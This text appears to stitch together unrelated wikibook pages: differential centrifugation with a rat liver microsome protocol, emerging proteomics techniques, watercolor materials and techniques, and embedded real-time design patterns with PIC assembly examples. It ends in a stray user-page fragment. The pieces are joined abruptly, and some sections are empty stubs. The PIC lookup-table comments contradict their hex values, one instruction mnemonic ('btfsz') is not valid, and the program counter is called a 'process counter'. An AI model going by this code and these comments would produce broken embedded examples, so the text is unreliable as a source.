*Differential Centrifugation


A Technique for Separating organelles or other differently-sized cell components In A centrifuge, Particles of the Same Size and Weight will settle out Into common Layers. 

Also, Differential centrifugation is a procedure in which the homogenate is subjected to repeated centrifugations each time increasing the centrifugal force. -Uses equilibrium density gradient: A solution composed of different layers because of the difference in density between the layers. Differential centrifugation separates the homogenate into:


-&gt;Nuclei
 

In cell biology, the nucleus (from Latin nucleus or nuculeus, kernel) is found in all eukaryotic cells and contains the nuclear genes which form most of the cell's genetic material. Nuclei have two primary functions: to control chemical reactions within the cytoplasm and to store information needed for cellular division.


-&gt;Mitochondria 


In cell biology, a mitochondrion (plural mitochondria) (from Greek mitos thread + khondrion granule) is an organelle, variants of which are found in most eukaryotic cells. Mitochondria are sometimes described as &quot;cellular power plants,&quot; because their primary function is to convert organic materials into energy in the form of ATP via the process of oxidative phosphorylation. Usually a cell has hundreds or thousands of mitochondria, which can occupy up to 25% of the cell's cytoplasm. Mitochondria usually have their own DNA, and, according to the generally accepted Endosymbiotic theory, they were originally derived from external organisms.


-&gt;Lysosomes
 

Lysosomes are organelles that contain digestive enzymes (acid hydrolases) to digest macromolecules. They are found in both plant and animal cells, and are built in the Golgi apparatus. At pH 4.8, the interior of the lysosomes is more acidic than the cytosol (pH 7). The lysosome single membrane stabilizes the low pH by pumping in protons (H+) from the cytosol, and also protects the cytosol, and therefore the rest of the cell, from the degradative enzymes within the lysosome. The digestive enzymes need the acidic environment of the lysosome to function correctly. For this reason, should a lysosome's acid hydrolases leak into the cytosol, their potential to damage the cell will be reduced, because they will not be at their optimum pH. All these enzymes are produced in the endoplasmic reticulum, and transported and processed through the Golgi apparatus. The Golgi apparatus produces lysosomes by budding. Each acid hydrolase is then targeted to a lysosome by phosphorylation. The lysosome itself is likely safe from enzymatic action due to having proteins in the inner membrane which has a three-dimensional molecular structure that protects vulnerable bonds from enzymatic attack.


-&gt;Microsomes 


In cell biology, a microsome is a small vesicle that is derived from fragmented endoplasmic reticulum produced when cells are homogenized. They contain the cell's cytochrome p450 enzymes, involved in oxidative metabolism.

Liver microsomes are used for determination of EROD activity as an indicator of CYP1A1-dependent enzymatic activity. The term microsome refers to a mixture of fragmented endoplasmic reticulum (ER) vesicles present in a cell homogenate after mechanical breakage (homogenization) of tissues such as liver. These microsomes can be concentrated and separated from the other cellular organelles by means of differential centrifugation. Different cellular organelles possess different and unique sedimentation velocities and sediment out of aqueous solution at different centrifugal forces. Unbroken cells, nuclei and mitochondria sediment out at 10,000g, while soluble enzyme and fragmented ER which contains the P450s stay in the solution. At a higher speed, 100,000g, ER sediments out of solution as pellet and the soluble enzymes stay in the supernatant. In this way, P450s in microsomes are concentrated and isolated. Microsomes appear as reddish brown color due to the presence of heme in P450s. P450s are highly abundant in livers of rats, mice and humans.

'''Technique of getting hepatic cytochrom P-450 from rat:'''

Rat is sacrificed by cervical dislocation. Liver is excised, chilled, blotted-dry with paper tissue, and weighed. Liver is homoginated using tissue homigenizer with a medium comprising of 0.154 M KCl containing 50 mM tris-HCl (pH 7.4). The homigenate is centrifused at 12000g for 20 minues, supernatant is collected and again centrifused for 1 hour at 105000g. Then, supernatant is descarded and pellet is resuspended in the homogenizing medium and centrifused again for 1 hour at 105000g. Liver microsome obtained from the pellet by resuspendingwith he homogenizing medium, is ready for use for pharmacological studies. All the procedures are performed at 4 degree celcious.


*Basic Centrifuges and Rotors


--&gt;Superspeed and Ultraspeed Centrifuges:
 

As two different types of preparative centrifuges may be distinguished: superspeed centrifuges and ultraspeed centrifuges or ultracentrifuges.

Superspeed centrifuges generally operate at speeds to about 20,000 rpm, usually do not require evacuation of the rotor chamber, and either drive the rotor directly to through belts or gears.

Ultracentrifuges can be operated at much greater speeds ( upto 65,000 or 75,000 rpm), thus the rotor chamber must be evacuated of air to reduce friction and permit accurate rotor temperature  control. 

In most ultracentrifuges the rotor is driven either by a motor and a set of gears or by an oil or air turbine system.


--&gt;Swinging-Bucket Rotors:


The most popular and widely used superspeed and ultraspeed centrifuge rotors are the swinging-bucket and fixed-angle rotors.


--&gt;Rotor and Tube Materials:


Early rotors such as the Svedberg rotors were made of steel and ocassionally brass.The high density of these materials and the resulting high rotor weight produces an appreciable load on the centrifuge drive and significantly limits operating speeds.

Most commercial rotors are now made of the partly or entirely of aluminum or titanium.


--&gt;Fixed-Angle Rotors:


Fixed-angle ( or angle head ) rotors are generally simpler in design than are swinging-bucket rotors. In this type of rotor, the centrifuge tubes are held at a specific and constant angle to the horizontal plane that is the tube does not reorient between the vertical and horizontal positions. 
 

*Convection in Swinging-Bucket and Fixed-Angle Rotors


Convection occurs whenever uniform suspensions of particles are sedimented in conventional swinging-bucket and fixed-angle rotors.

The term &quot;convection&quot; means the bulk movement of solute and/or solvent within the centrifuge tube.

The Most common cause of unwanted cinvection is temperature variation in different parts of the centrifuge tube.


*Nature of Tissue Fractions Produced by Differentail centrifugation


The approaches to tissue fractionation taken by Behrens,Bensley, and others in the early 1930s had a major aim the isolation from disrupted cells of one or more identifiable components that could then be physically and chemically characterized.The principal method of analysis was light microscopy. In this sense, their approach was strictly preparative and is to be contrasted with the more anlytical procedures of Claude and his successors who were concerned with the purity of centrifugally isolated fractions, examining their enzymatic activities and questioning whether certain properties were unique to specific types of subcellular particles or were more broadly distributed.


*The four major differntial fractions.


1. The Nuclear Fraction:

--&gt;The pellet produced by centrifugation of the original homogenate at 600g for 10 minutes.

2. The Mitochondrial Fraction:

--&gt;The pellet obtained when the post-nuclear supernatent (i.e,,the supernatent of the first centrifugation ) is centrifuged at 5000g for 10 minutes.

3. The Microsomal Fraction:

--&gt;The pellet produced when the postmitochondrial supernatent is centrifuged at 50,000g for 60 minutes.

4. The Cytosol or Soluble Phase:

--&gt;The supernatent of the last centrifugation.

__FORCETOC__
=Emerging and Miscellaneous Technologies in Proteomics=
This part of the book will be an area where proteomics techniques that have been newly developed will be discussed. Techniques that do not currently fit into any other part of the book can also be added to this page. As chapters or sections are added elsewhere that discuss these techniques in the context of a greater proteomics problem, the information on this page will be moved to those pages.

==X-Ray Tomography==
'''Description and Discussion of X-ray Tomography.'''

A new branch of X-ray microscopy is being used in proteomics analysis. This is called X-ray Tomography. This method uses projected images to calculate and reconstruct a 3D object. This technology is being used in proteomics to determine the location of labeled proteins or large complexes within a cell. This technique can also be used in conjunction with images of cells from light based microscopes to help identify where a protein is located and how this location factors in to its function and identification.

==Introduction to Proteoinformatics==

Proteoinformatics is the use of bioinformatics and computational biology techniques solely within the realm of protein identification and proteomics. Proteoinformatics is currently in its infancy and the largest work being done is on standardizing databases and data submission. Other proteoinformatic work is being done on the image analysis of 2D gels and other images in proteomics used to help identify and annotate proteins in the proteome.

===Protein Identification Database===

====What are Protein Identification Databases?====

Protein Identifications Databases such as ProFound at Rockefeller University and Protein Prospector at the UCSF Mass Spectrometry Facility are used to help identify proteins found with proteomics techniques such as mass spectrometry. Digestion of proteins into peptide fragments allows each protein to break apart in a different way, resulting in a unique peptide fingerprint that can be used to identify the protein. The masses of these fragments as well as the molecular weights and isoelectric points are what is stored in many of these databases. This data can be used to perform high-throughput protein identification.

====The Future of Protein Identification Databases====

In order to continue advancing the cause of mapping the human proteome, international databases need to be established which integrate both transcriptome and proteome data. The Human Proteome Organization is currently working on establishing a defined standard for data submission and annotation for the many different proteomics techniques currently used to identify and annotate proteins. 

===New Techniques in Image Analysis===

According to the Image Analysis Wikipedia page, &quot;Image analysis is the extraction of meaningful information from images.&quot; In terms of Proteomics, image analysis can be used to compare different images generated using proteomics techniques, such as 2D-PAGE gel images. New programs are being developed that will help to optomize and automate the process of locating a protein spot between two gel images in order to identify the differences between 2D-PAGE gels. Other programs can be used to help clean up and remove variability between these images as well.

==Laser Capture Microdissection==
[[Image:Lasercapture.JPG|thumb|Diagram of Laser Capture Microdissection]]
Laser capture microdissection or LCM is a process that isolates and removes distinct populations from a tissue. This will facilitate the comparison of diseased tissue with normal tissue from an organism. 

In LCM, an infrared laser beam melts a thermosensitive polymer film that traps a specific group of cells. This polymer film is then extracted and moved to a test tube where an extraction buffer is used to remove the groups of cells for more advanced proteomics analysis such as 2D-PAGE, Ion Chromatography, etc. This technology will become more useful as systems with higher sensitivity for analysis of smaller amounts of tissue become developed and realized.

==Proteomic Complex Detection using Sedimentation==

Approaches such as TAP tagging, which require the addition of fusion proteins, can interfere with protein interactions that would have normally occurred. Many times it takes a great deal of work to express these tagged proteins, so this technique is used to give evidence that there is a stable protein complex detected early on in the proteomics experiment before more laborious approaches are used to isolate and identify the protein complexes of interest. Issues also occur in MS and 2D Gel processes where one cannot be sure that a portion of a gel spot is the desired protein because multiple proteins could be traveling together in that spot as a complex.

This is where proteomic complex detection using sedimentation (ProCoDeS) is applicable. ProCoDeS is a technique for the high-throughput identification of both soluble and membrane proteins that are found in stable complexes. Relative sizes of protein complexes are estimated via their sedimentation in a gradient. In this case a rate zonal gradient or RZG is used to better estimate the relative size of protein complexes. The distribution of a protein of interest in this sedimentation can be detected using classic techniques such as Western Blotting or newer techniques such as ICAT. This can be done for a large number of proteins. Thus, ProCoDeS can be used to identify stable protein complexes. ProCoDeS is especially well suited for the screening of unrefined cellular material to help find new proteins that cannot be discovered because they exist in protein complexes such as proteins found in protein membranes.

[[File:Watercolors.jpg|thumb|A set of watercolors.]]

===Paint===
The broader term for water-based painting media is &quot;watermedia&quot;. The term &quot;watercolor&quot; most often to refers to traditional transparent watercolor or gouache (an opaque form of the same paint), but also includes the use of thinned acrylic paint.

Traditional watercolor paint is made of finely-ground pigment mixed with gum arabic for body, and glycerin or honey for viscosity and to bond the colorant to the painting surface. Unpigmented filler is added to gouache to lend opacity to the paint. Oil of clove is used to prevent mold.

Watercolor paints vary in their transparency, some being less transparent (more covering) than others. The more transparent paints allow the paper (or an undercolor) to show through while others allow less of the undercolor to be seen.

As there is no transparent white watercolor, the white parts of a watercolor painting are most often areas of the paper &quot;reserved&quot; (left unpainted) and allowed to be seen in the finished work. White paint might be used to indicate snow on a fence or the foam in the sea, as examples, by using Chinese White or White Gouache. These are not transparent. Traditionally, such non-transparent paint is used sparingly so as not to lose the light and airy look of the work.

Some watercolor pigments are &quot;fugitive&quot;, meaning they fade over time when exposed to light. An example is Alizarin Crimson. Some paint makers offer a different formulation of pigment as a less-fugitive alternative. These often have the word &quot;hue&quot; as part of the name. &quot;Alizarin Crimson Hue&quot; can be expected to be less fugitive than Alizarin Crimson.

&quot;Staining&quot; is another characteristic of certain watercolor pigments. A staining color is difficult to remove and persists on the paper. Less staining colors can be lightened or removed almost entirely when wet or when re-wetted by &quot;lifting&quot; with a wet brush, paper towel, tissue, sponge, or similar.

Commercial watercolor paints come in two grades: &quot;Artist&quot; (or &quot;Professional&quot;) and &quot;Student&quot;. Artist quality paints are usually formulated using a single pigment, which results in richer color and vibrant mixes. Student grade paints have less pigment, and often are formulated using two or more less expensive pigments. Artist and Professional paints are more expensive but many consider the quality worth the higher cost.

Paint pigments and formulation vary among manufacturers. Paints with the same color name from different makers can vary in hue, staining, and other characteristics.

===Brushes===
Brushes for watercolor are made to hold water and softer as compared to the stiffer brushes used for acrylic and oil paint.

Watercolor brushes come in various shapes including flat, round, mop, and fan. There are numerous specialty brushes; for example, a long thin brush originally designed to paint the lines of rope (rigging) on a seascape is called a &quot;rigger&quot;.

Artists typically have a few favorites and do most work with just one or two brushes. A single brush can produce many lines and shapes. A &quot;round&quot; for example, can create thin and thick lines, wide or narrow strips, curves, and other painted effects. A flat brush when used on end can produce thin lines or dashes in addition to the wide swath typical with these brushes. 

Brush hairs come from a variety of sources including the very expensive hair of the Kolinsky Sable, the ear hair of the ox or other cattle, and others. &quot;Camel&quot; is used to describe hairs from several sources, none of which is from a camel.

Brush hairs can be natural, synthetic, or a combination. Brush prices vary considerably depending on the type of hair and the quality of the manufacture. A good brush will hold a fair amount of water and will keep and return to its original shape even after much use.

Brushes are numbered to indicate the size of the brush, the larger numbers for the larger brushes. A typical manufacturer's offering of brushes might go from a very small &quot;0&quot; to the larger size &quot;20&quot; or more. Flat, wide brushes are usually described by the width of the brush such as &quot;1/2 inch&quot; or &quot;1 inch&quot;. There are no common standards for brush sizes. A &quot;10&quot; Round from two manufacturers might be slightly different in size.

===Paper===
Watercolor paper is designed to properly support the paint and be sturdy enough to withstand the painting action. 

Heavier paper is much better than lighter paper if you are planning to make a brightly colored painting.  Thin paper may allow pigments to soak through causing dampness and dull coloring.

The surface of watercolor paper can vary in its smoothness from very smooth to very rough. A watercolor painting on rough paper will result in quite a different look than a similar painting on smoother paper. The artist selects paper with a finish to give the desired effect.

Rough-surfaced paper is called &quot;Rough&quot;, a smoother surface but still slightly rough is called &quot;Cold Press&quot; (aka &quot;Not&quot;), the smoothest surface is &quot;Hot Press.&quot;

Watercolor paper is typically made of 100% cotton rag. Papers of lesser quality might be mixtures of rag (cotton) and other materials. Some artists use only better grade papers to get the effects they desire. The quality of paper can make a significant difference in the result.  

The thickness of commercial watercolor paper varies from 90 pounds to 300 pounds (the weight of a ream of about 500 sheets of the paper.) A middle weight, common thickness, is 140 pound paper. While almost any paper of any thickness will buckle when wet, paper less than 140 pound thickness will buckle severely from the water and should be &quot;stretched&quot; before using. Even 140 pound paper will show some stress when wet watercolor is applied over large areas. 300 pound weight paper does not buckle severely and does not have to be stretched. 

An alternate to this is to wet the water on a non-absorbing surface like plexiglass. Once the paper is soaked and lying flat on the surface, roll over the paper with a tightly rolled-up towel, squeezing and pressing the water out as you roll. The paper remains wet and stuck to the plexiglass with no bubbles. You can draw and paint right on the damp paper, and it will not buckle for usually up to an  hour.

==Techniques==
[[Image:Julaftonen av Carl Larsson 1904.jpg|thumb|[[Carl Larsson]], ''The [[Christmas Eve]]'', watercolor, ([[1904]]-[[1905]]).]]

Traditionally, watercolor paint is applied with brushes, but it may be applied with other implements in experimental approaches or mixed with other materials (usually [[Polymethyl methacrylate|acrylic]] or [[collage]]).

The paint is thinned before application to allow for lighter areas within the painting. This transparency provides watercolor its characteristics of brightness, ''sparkle'', freshness, and clarity of color since light has passed through the film of paint and is reflected back to the viewer through the film. 

According to a tradition, dating from at least the early [[20th century]], the white of the paper is the only white used in transparent watercolor. Opaque paint is seldom used for whites or to ''overpaint''. 

Watercolor techniques have the reputation of being quite demanding; it is more accurate to say that watercolor techniques are unique to watercolor. Maintaining a high quality of value differences and [[color]] clarity are typically the most difficult properties to achieve and maintain. 

The medium is effective in [[portraiture]], [[Figure painting|figurative art]], and [[photorealism]].

Watercolor proponents prize it as a studio medium for its lack of odor and ease of cleanup, and also as a [[en plein air|plein air]] medium for its portability and quick drying.

[[Fingerpainting]] originated in [[China]] with watercolor paints.

===Washes and glazes===

Basic watercolor technique involves washes and glazes. A wash refers to the application of a uniform color over an area of the painting. Typically, this might be a light blue wash for the sky, a uniform color on a field or other area. Washes can be &quot;graded&quot; or &quot;graduated&quot; if they gradually become lighter or darker in parts such the fading of color to show the lighter sky near the horizon. A &quot;variegated&quot; wash blends more than one color such as a wash with areas of blue and perhaps some red or orange for a sky at sunrise or sunset.  

===Wet in wet===

Two methods of applying paint to the surface for special effect are &quot;wet-in-wet&quot; (or &quot;wet-on-wet&quot;) and &quot;dry brush&quot;. Wet-in-wet is used to avoid a hard edge at the margin of the paint. Wet-in-wet paint flows on a wet surface. The paint is wet (diluted) and the surface of the medium is wet.

The surface of the paper or other medium is first &quot;painted&quot; with water, thinned paint is then dripped or lightly applied to the wet surface. The color flows along the wet area. More paint can be added to increase the area covered.

After the first wet application has dried, additional wet layers can be applied. The flow is controlled to some extent by the wetness of the surface; the amount, consistency, and placement of the paint; and by tilting the surface to encourage the paint to flow in the desired direction. The somewhat unpredictable results of the wet-in-wet technique can lead to some surprising but welcome effects.

===Dry brush===

Dry brush is used to obtain a rough, textured appearance for the edges of beach grass, a rocky exposed hill surface, tree bark,  sunlight skipping on the surface of water, are some examples. A brush is loaded with relatively thick paint then lightly pulled over the dry surface of the medium. Some artists hold the brush with just two or three fingers at the very end of the handle so just the weight of the brush glides along the surface. 

The paint adheres and covers only the higher points and ridges of the surface but stays out of the deeper areas. The method is especially effective on Rough and Cold Press (medium rough) paper. It is not very useful on smooth surfaces. 

===Painting light to dark===

Watercolors are typically made darker on the paper by repeated application of the same color. These coats of paint are  called &quot;glazes. A glaze of a different color can also be used to create a combined color. It is also possible to achieve various lightness and darkness of a color (value) by diluting the paint in the mixing area before application.

===Limited palette===

An artist might use a limited set of colors in his or her palette creating other colors by mixing two or three colors from the limited set. Mixing more than three colors can result in a muddy, unacceptable color.

The &quot;[[palette]]&quot; refers to the array of colors used in a painting and also refers to the tray, dish, or other implement used to hold and mix the paints.

===Other considerations===

When using watercolors, it is a good idea to think of using the medium in the consistency as it comes from the tube. Using dried out &quot;cake&quot; watercolors will prevent the user from being able to take full advantage of the medium. When the colors are tube fresh, one can go from totally thinned with water to create the most elusive effects and in an instant to very dense full bodied mixtures for deep dark passages. The best way to keep colors from drying out would be to use a covered palette such as the &quot;John Pike Watercolor Palette&quot; which has plenty of colors &quot;wells&quot; and sufficient mixing space. A great tip for squeezing paint from the tube is as follows: Squeeze an amount about the size of a lima bean or slightly larger. Do not leave the paint in a &quot;mound&quot;, but rather spread it through the area of the designated color well. The logic behind this method is that since watercolors are resoluble with water, one can simply spray water on the surface of dried color to refresh it as it came from the tube. If the colors are left in a mound, the water will roll off; but if the colors are spread evenly, the water has no place to go but into the color bringing it back to life. Do this twenty minutes or so before painting if your colors are dried out or if time does not allow just squeeze a little fresh color over the exsisting dried out color and spread. The new color will interact with the old making all the color usable. Do not put a damp sponge in the palette for storage as this can lead to mildew and mold. The primary thing to remember is to take full advantage of the wide range of consistentcies watercolor has to offer. 

Though there seem to be endless colors available in tubes, one need only a very limited palette. Consider a primary color palette to include: Lemon Yellow; Cadmium Yellow; Cadmium Red; Alizarin Crimson; Cerulean Blue; French Ultramarine Blue; Phtalo Blue; and perhaps Burnt Sienna and Raw Sienna. These nine colors will give you the ability to mix virtually any color possible. A brief summary of color mixing is: A red and a yellow make orange; yellow and blue make green; blue and red make violet. A red, yellow, and blue make gray and if mixed dense enough, black. It's simple color theory of primary color mixing. Primary colors being: red - yellow - blue. Secondary colors (mixing any two colors): orange - green - violet. and Tertiary colors (three color mixes): any gray imaginable and black. When mixing three colors, avoid muddy mixtures by &quot;undermixing&quot; on the palette. Pull the colors into the mixing space and simply &quot;swish&quot; the colors together. Your darkest darks can be very exciting so long as you are sure to not &quot;overmix.&quot; Another reason for muddiness comes from excessive brushing. Apply the washes with conviction being sure to limit your brushstrokes.


==Making other colors==
 
If you don't have the color you want, you don't have to buy that color, you can simply mix it! Here are a few mixtures:

Yellow+blue=green
Yellow+red=orange
Red+blue=purple
Red+green=brown
 
Why mixing paints doesn't produce the color white .
The accompanying figure represents the artist's color wheel.   Colors opposite one another are called complementary colors.   Those next to each other are adjacent colors.

A dab of paint is an opaque body.   Its color is due to reflection.   No paints are pure colors; they reflect light over a narrow wavelength band.   Yellow paint reflects yellow light, but also reflects small amounts of orange and green light, while absorbing red and blue light.   Red paint absorbs blue and yellow light, but reflects a bit of orange.   When yellow and red paints are mixed, the yellow paint absorbs the red light and the red paint absorbs the yellow light, but they both reflect orange.   So the mixture appears orange.   When two paints mix, the color produced is the color that both paints reflect.   Add some blue paint, which absorbs orange, to the red and yellow mixture and the paint loses its hue.   By mixing all your paints together, each pigment absorbs a particular wavelength and therefore no colors are reflected and the paint mixture appears a dark, dull gray.


Blue, red, and yellow are primary colors.  Violet, orange and green are the secondary colors (colors made from two primaries).  The array of browns, mauves and grays are the tertiary colors (colors made from a primary and a secondary, in other words, colors made from all three primaries).  It is interesting to note that the tertiary colors are the most common colors in the landscape, followed by secondaries, with pure primaries being ever so rare in the natural landscape--rainbows, sunsets and the aurora borealis, to name a few.

Programming for ''real-time'' environments is hard and needs a good understanding of the complete system, hardware as well as software. In the ideal case, every part of the system is well described and easily understandable, but the real world seldom allows this ideal situation. Therefore, the system should be robust against the ''uncertainties'' in the system. [[w:Design Pattern|design patterns]] are a useful support for all designers: they are ''generalized solutions to commonly occurring problems'', based on experience of what has worked already in the past in a large number of systems. Patterns are also appropriate to create [[w:porting|portable]] code that may be reused and adapted in several applications. 

Design patterns always come with a certain ''context'': they are the result of a number of design ''forces'' that each pull the design in several directions, and for which the pattern provides a balanced solution. However, the forces in different systems may be so different that also the resulting trade-off gives rise to a different pattern.
 

== Software patterns without need for an operating system ==

When programming for micro-controller (like a PICmicro), programs will often be written in machine language or low level languages like assembler. Assembler programs tend to be smaller and more efficient with active memory. Nevertheless it's also possible to use higher level languages such as C when the controller has enough resources. The article [http://mic.unn.ac.uk/miclearning/modules/micros/ch8/micro08notes.html &quot;Using A High level Programming Language&quot;] has a short list of the advantages of using a higher level language over assembler.
(Even higher level languages have those same advantages over C, but they are rarely available on small microcontrollers).

In this section we will only discuss design patterns used when programming in assembler. These design patterns seem really basic, but good understanding of them is important. The knowledge of assembler is not needed, but a good help to understand this section. 

=== Subroutines ===
When you often need to do same operations, you can use subroutines. By putting a value in the register you can give a parameter to the subroutine. The result of the subroutine will be also stored in the register. Here we give a simple example of a subroutine:
&lt;source lang=&quot;pic16&quot;&gt;
Start	movlw	02h		; Put a bite in the working register
	movwf	PORTA		; Move the bite to a register, this will turn on a led
	call 	Delay		; Call subroutine
	movlw	00h		; Put a bite in the memory
	movwf	PORTA		; Move the bite to a register, this will turn off a led
	goto	Start
	
Delay				; Subroutine Delay
Loop1	decfsz	COUNT,1		; decrease value of COUNT, and skip next instruction if zero
	goto	Loop1		; goto label Loop1
	return
&lt;/source&gt;

Sometime you need a structure where you can store values in.
Or you need to do a conversion but it's easier to get values from table.
Then the use of a data table is handy.

On a PICmicro, constant data tables (in Flash memory) are a kind of normal subroutine. When the subroutine is called, the value in the working register will be used to determine the amount of instructions the processor has to skip. This is done by increasing the 'Process counter'? The process counter is the address of the instruction that is currently executed. Increasing the counter will make the processor skip the next instructions. 
A little example, in the data table we have the order in which 5 leds (5 bits) have to blink.
&lt;source lang=&quot;pic16&quot;&gt;

Start	movlw	05h		; Put value 5 in the working register (this is initialization value) 
	movwf	COUNT1		; Assign the value of the working register to COUNT1

Loop1	call	Table		; Look the pattern in the table 
	movwf	PORTA		; Move the pattern of the working register to the led register
	call 	Delay		; Call subroutine
	decf	COUNT1,F	; Decrease, put a byte in the COUNT1 register
	btfsz 	STATUS,Z	; Test if overhead
	goto	Loop1		; No, get next pattern	
	goto	Start		; Yes, run the program from the start again

Delay				; Subroutine delay
Loop2	decfsz	COUNT2,F	; Decrease value of COUNT1, and skip next instruction if zero
	goto	Loop2		; Goto label Loop2
	return

Table   addwf	PCL		; Add value to get pattern
	retlw   01h		; Return pattern 00001b, LED1 - ON
	retlw   02h		; Return pattern 00010b, LED2 - ON
	retlw   03h		; Return pattern 00100b, LED3 - ON
	retlw   04h		; Return pattern 01000b, LED4 - ON
	retlw   05h		; Return pattern 10000b, LED5 - ON
&lt;/source&gt;

: ''The article [http://massmind.org/techref/microchip/tables.htm PIC &quot;Microcontroller  Memory  Methods: Tables&quot;] has detailed information on various ways to access a table, the &quot;crossing a 256 byte page boundary&quot; gotcha (which always occurs with tables longer than 256 bytes, and sometimes occurs even with very short tables), and work-arounds.''
: ''The article [http://massmind.org/techref/microchip/fsr.htm &quot;File Select Register&quot;] discusses the file select register, which is used for reading '''and writing''' arrays of values in RAM.''

=== Interrupts ===
{{wikipedia|interrupts}}

FIXME: write
something about basic interrupt programming

We talk more about interrupt servicing in a later chapter,
[[../Real Time Operating systems#Interrupt servicing | interrupt servicing]].

=== Watchdog timer ===
{{wikipedia|watchdog timer}}
==== Aim ====
The watchdog timer is an internal timer in the processor. The purpose of this timer is to avoid that an embedded controller gets stuck.

==== Implementation ====
The principle of a watchdog timer is simple, it resets the embedded controller after a predefined time. But this only happens if the program didn't reset the watchdog timer first. 

Therefore the program should reset the watchdog timer on a predefined time. When the watchdog timer doesn't get reset on time, the program probably got stuck and the micro controller will reset itself.
See also:
[[Embedded Control Systems Design/Real Time Operating systems#Watchdog timers | RTOS watchdog timers]], [[Embedded Systems/Threading and Synchronization#Watchdog Timer | Watchdog timer]].

= Design patterns &amp; Real-time programming for embedded devices with OS =

Assembler programs are often hardware specific and not very portable and modular. This makes programming of big complex system rather difficult.
This can be solved by using an 'abstraction layer' that handles the processor and the hardware interfacing. This layer is also known as 'the kernel' of a system. The kernel also takes care of the hardware specific calls and task management, which allows to stay focused on the most important task; Making a real-time program. Of course more time and more memory is needed, but it makes the program more flexible and modular. Also the use of higher programming language makes the code also portable and easier to debug. 

In the next section we will describe some important design patterns:

=== Configuration &amp; execution ===

==== Aim &amp; Problem ====
The most important difficulty in real-time programming is knowing that a specified operation will happen on a defined moment. Therefore it's important to know exactly how long each operation will take.

==== Implementation ====
This pattern consist of 2 parts. In the first part all operations that have no predictable execution time are done. This includes memory allocation, hardware initialisation and object creation. This part is called the ''Configuration of the system''. When the configuration is completely done, the main loop can be started. 

More about: Logical vs. Physical architecture 

More about: C++

==== Consequences ====
* All memory allocation should be done _before_ starting.

=== Asynchronous &amp; Synchronous design pattern ===
{{wikipedia|interrupt handler}}

The asynchronous/synchronous design pattern is also known as:
* interrupt service routine / deferred service routine (ISR/DSR)
* first-level interrupt handler / second-level interrupt handler (FLIH/SLIH)
* fast interrupt handlers / slow interrupt handlers
* top-half of interrupt / bottom-half of interrupt

==== Aim ====
When data arrives on a input, the processor will execute a predefined interrupt function. Sometimes this data needs to be processed before it can be used. The interrupt function should be kept as short as possible to allow new data to arrive, and to avoid to miss this new data (because of the interrupt lock).

==== Implementation ====
In this design pattern the data handling happens in 2 phrases: 
* the interrupt service routine (ISR): This is the function that handles the data when the interrupt comes in. Often it just reads the data on the input and writes it in a buffer. It runs with interrupts disabled, and ends with a &quot;return from interrupt&quot; that enables interrupts.
* the deferred service routine (DSR): This is a function that runs continuously in the background and that processes the new data. It runs with interrupts enabled, and ends with a normal &quot;return&quot;.

==== Consequences ====
* No data lost
* Sometimes it's possible that more data comes than needed. The DSR function will then only process the needed data.

=== Event handling ===
{{wikipedia|event handling}}

==== Aim ====

==== Implementation ====

==== Consequences ====


=== Monitor ===
{{wikipedia| monitor (synchronization) }}

==== Aim ====

==== Implementation ====

==== Consequences ====

=== Finite state machine pattern===
This pattern is also known as the ''State'' pattern or the FSM pattern
==== Aim ====
A system often consist of different phrases, where each phrase has to complete some actions. Therefore the embedded controller should react differently on inputs depending phrase of the system.

==== Implementation ====

This can be done by programming a FSM, this is a class where the behaviour of the function differs depending of the state of the system.

We discuss finite state machines in more detail in a later chapter,
[[../Finite State Machines and Petri Nets|../Finite State Machines and Petri Nets]]

==Problems of real time programming==
=== Deadlock ===
{{wikipedia| deadlock}}

A '''deadlock'''  is a situation wherein two or more competing actions are waiting for the other to finish, and thus neither ever does. It is often seen in a [[w:paradox|paradox]] like '[[w:the chicken or the egg|the chicken or the egg]]'.

In the computing world '''deadlock'''  refers to a specific condition when two or more processes are each waiting for another to release a resource, or more than two processes are waiting for resources in a circular chain (see ''[[w:Deadlock#Necessary conditions|Necessary conditions]]''). Deadlock is a common problem in [[w:multiprocessing|multiprocessing]] where many processes share a specific type of mutually exclusive resource known as a ''software,'' or ''soft,'' [[w:lock (computer science)|lock]]. Computers intended for the ''[[w:time-sharing|time-sharing]]'' and/or ''[[w:real-time|real-time]]'' markets are often equipped with a ''hardware lock'' (or ''hard lock'') which guarantees ''[[w:Read/write lock pattern|exclusive access]]'' to processes, forcing [[w:serialization|serialization]].  Deadlocks are particularly troubling because there is no ''general'' solution to avoid (soft) deadlocks.

This situation may be likened to two people who are drawing diagrams, with only one pencil and one ruler between them. If one person takes the pencil and the other takes the ruler, a deadlock occurs when the person with the pencil needs the ruler and the person with the ruler needs the pencil, before he can give up the ruler. Both requests can't be satisfied, so a deadlock occurs.

=== Priority inversion ===
{{wikipedia| Priority inversion}}

In [[w:scheduling (computing)|scheduling]], '''priority inversion''' is an antipattern.
Priority inversion occurs when a low priority [[w:task|task]] holds a shared [[w:resource (computer science)|resource]] that is required by a high priority task. This causes the execution of the high priority task to be blocked until the low priority task has released the resource, effectively &quot;inverting&quot; the relative priorities of the two tasks. If some other medium priority task, that does not depend on the shared resource, attempts to run in the interim, it will take precedence over both the low priority task ''and'' the high priority task.

In some cases, priority inversion can occur without causing immediate harm -- the delayed execution of the high priority task goes unnoticed, and eventually the low priority task releases the shared resource. However, there are also many situations in which priority inversion can cause serious problems. If the high priority task is left [[w:Resource starvation|starved]] of the resources, it might lead to a system malfunction or the triggering of pre-defined corrective measures, such as a [[w:watchdog timer|watch dog timer]] resetting the entire system. The trouble experienced by the [[Embedded Control Systems_Design/Learning from failure#Mars Pathfinder | Mars Pathfinder]] is a classic example of problems caused by priority inversion in [[w:realtime|realtime]] systems.

Priority inversion can also reduce the [[w:perceived performance|perceived performance]] of the system. Low priority tasks usually have a low priority because it is not important for them to finish promptly (for example, they might be a [[w:Batch_job | batch job]] or another non-interactive activity). Similarly, a high priority task has a high priority because it is more likely to be subject to strict time constraints -- it may be providing data to an interactive user, or acting subject to realtime response guarantees. Because priority inversion results in the execution of the low priority task blocking the high priority task, it can lead to reduced system responsiveness, or even the violation of response time guarantees.

Should interrupts be explained again here? They have been discussed in the chapter Operating Systems, and even more extensively in the Real Time Operating Systems chapter. Perhaps creating a different page and merging all text about interrupts could be a solution?

      <text xml:space="preserve">Hello.  I am the same Bth as [[w:User:Bth]].  I've got a bit fed up of Wikipedia because the stuff I'm vaguely knowledgeable on has already been made better by people far more expert than me, the Manual of Style has got too big and complicated for me to hold in my head so I feel like I'm not really helping when I do proofreading/copyediting stuff, and it's too full of arguments.

Here, on the other hand, I feel like I might be able to do some good.

